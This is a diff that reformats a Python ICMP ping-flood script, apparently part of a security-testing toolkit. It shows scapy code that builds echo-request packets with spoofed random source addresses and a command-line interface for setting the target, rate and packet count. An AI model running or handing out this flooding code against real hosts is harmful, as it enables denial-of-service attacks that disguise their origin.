@@ -34,13 +34,13 @@ License: Proprietary
 Version: 1.0.0
 """
 
-import os
-import sys
-import time
-import random
 import argparse
 import ipaddress
-from typing import Dict, Any
+import os
+import random
+import sys
+import time
+from typing import Any
 
 # Add parent directory to path to import logger
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
@@ -48,21 +48,23 @@ try:
     from logger import get_logger
 except ImportError:
     import logging
+
     def get_logger(name):
         logger = logging.getLogger(name)
         if not logger.handlers:
             handler = logging.StreamHandler()
-            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+            formatter = logging.Formatter("%(asctime)s - %(name)s - %(levelname)s - %(message)s")
             handler.setFormatter(formatter)
             logger.addHandler(handler)
             logger.setLevel(logging.INFO)
         return logger
 
+
 logger = get_logger(__name__)
 
 # Import scapy
 try:
-    from scapy.all import IP, ICMP, Raw, RandIP, send, conf
+    from scapy.all import ICMP, IP, RandIP, Raw, conf, send
 except ImportError:
     logger.error("This script requires the scapy library.")
     logger.error("Install it using: pip install scapy")
@@ -87,13 +89,15 @@ class ICMPFloodAttack:
         verbose (bool): Whether to enable verbose output
     """
 
-    def __init__(self,
-                 target_ip: str,
-                 packet_count: int = 1000,
-                 rate: int = 100,
-                 packet_size: int = 64,
-                 spoof_ip: bool = True,
-                 verbose: bool = False):
+    def __init__(
+        self,
+        target_ip: str,
+        packet_count: int = 1000,
+        rate: int = 100,
+        packet_size: int = 64,
+        spoof_ip: bool = True,
+        verbose: bool = False,
+    ):
         """
         Initialize the ICMP flood attack simulator.
 
@@ -127,7 +131,7 @@ class ICMPFloodAttack:
 
         conf.verb = 1 if verbose else 0
 
-        logger.info(f"Initialized ICMP flood attack simulation")
+        logger.info("Initialized ICMP flood attack simulation")
         logger.info(f"Target: {target_ip}")
         if self.verbose:
             logger.info(f"Packet count: {packet_count}, Rate: {rate} packets/second")
@@ -150,10 +154,12 @@ class ICMPFloodAttack:
         ip_layer = IP(dst=self.target_ip, src=src_ip)
         icmp_layer = ICMP(type=8, code=0)  # Echo Request
 
-        packet = ip_layer/icmp_layer/Raw(load=payload)
+        packet = ip_layer / icmp_layer / Raw(load=payload)
 
         if self.verbose:
-            logger.debug(f"Created ICMP packet: {src_ip} -> {self.target_ip} ({self.packet_size} bytes)")
+            logger.debug(
+                f"Created ICMP packet: {src_ip} -> {self.target_ip} ({self.packet_size} bytes)"
+            )
 
         return packet
 
@@ -178,7 +184,7 @@ class ICMPFloodAttack:
             logger.error(f"Error sending ICMP packet: {str(e)}")
             return False
 
-    def execute(self) -> Dict[str, Any]:
+    def execute(self) -> dict[str, Any]:
         """
         Execute the ICMP flood attack.
 
@@ -214,7 +220,7 @@ class ICMPFloodAttack:
             self._print_summary(stats)
             return stats
 
-    def _get_statistics(self) -> Dict[str, Any]:
+    def _get_statistics(self) -> dict[str, Any]:
         """Get statistics about the attack execution."""
         end_time = self.end_time or time.time()
         start_time = self.start_time or end_time
@@ -231,10 +237,10 @@ class ICMPFloodAttack:
             "actual_rate": actual_rate,
             "rate_efficiency": (actual_rate / self.rate * 100) if self.rate > 0 else 0,
             "packet_size_bytes": self.packet_size,
-            "estimated_traffic_bytes": total_traffic
+            "estimated_traffic_bytes": total_traffic,
         }
 
-    def _print_summary(self, stats: Dict[str, Any]) -> None:
+    def _print_summary(self, stats: dict[str, Any]) -> None:
         """Print a summary of the attack execution."""
         logger.info("=" * 50)
         logger.info("ICMP Flood Attack Summary")
@@ -246,7 +252,7 @@ class ICMPFloodAttack:
         logger.info(f"Actual rate: {stats['actual_rate']:.2f} packets/second")
         logger.info(f"Rate efficiency: {stats['rate_efficiency']:.2f}%")
         logger.info(f"Packet size: {stats['packet_size_bytes']} bytes")
-        logger.info(f"Estimated traffic: {stats['estimated_traffic_bytes']/1024:.2f} KB")
+        logger.info(f"Estimated traffic: {stats['estimated_traffic_bytes'] / 1024:.2f} KB")
         logger.info("=" * 50)
 
 
@@ -254,38 +260,38 @@ def parse_arguments() -> argparse.Namespace:
     """Parse command-line arguments for the ICMP flood attack."""
     parser = argparse.ArgumentParser(
         description="ICMP Flood Attack Simulation Tool (Ping Flood)",
-        epilog="IMPORTANT: Use only for authorized security testing."
+        epilog="IMPORTANT: Use only for authorized security testing.",
     )
 
     parser.add_argument(
-        "-t", "--target",
-        dest="target_ip",
-        required=True,
-        help="IP address of the target"
+        "-t", "--target", dest="target_ip", required=True, help="IP address of the target"
     )
 
     parser.add_argument(
-        "-c", "--count",
+        "-c",
+        "--count",
         dest="packet_count",
         type=int,
         default=1000,
-        help="Number of packets to send (default: 1000)"
+        help="Number of packets to send (default: 1000)",
     )
 
     parser.add_argument(
-        "-r", "--rate",
+        "-r",
+        "--rate",
         dest="rate",
         type=int,
         default=100,
-        help="Number of packets to send per second (default: 100)"
+        help="Number of packets to send per second (default: 100)",
     )
 
     parser.add_argument(
-        "-s", "--size",
+        "-s",
+        "--size",
         dest="packet_size",
         type=int,
         default=64,
-        help="Size of ICMP packet in bytes (default: 64)"
+        help="Size of ICMP packet in bytes (default: 64)",
     )
 
     parser.add_argument(
@@ -293,21 +299,15 @@ def parse_arguments() -> argparse.Namespace:
         dest="spoof_ip",
         action="store_true",
         default=True,
-        help="Use random source IPs (default: True)"
+        help="Use random source IPs (default: True)",
     )
 
     parser.add_argument(
-        "--no-spoof",
-        dest="spoof_ip",
-        action="store_false",
-        help="Don't use random source IPs"
+        "--no-spoof", dest="spoof_ip", action="store_false", help="Don't use random source IPs"
     )
 
     parser.add_argument(
-        "-v", "--verbose",
-        dest="verbose",
-        action="store_true",
-        help="Enable verbose output"
+        "-v", "--verbose", dest="verbose", action="store_true", help="Enable verbose output"
     )
 
     return parser.parse_args()
@@ -331,7 +331,7 @@ def main() -> None:
             rate=args.rate,
             packet_size=args.packet_size,
             spoof_ip=args.spoof_ip,
-            verbose=args.verbose
+            verbose=args.verbose,
         )
 
         attack.execute()
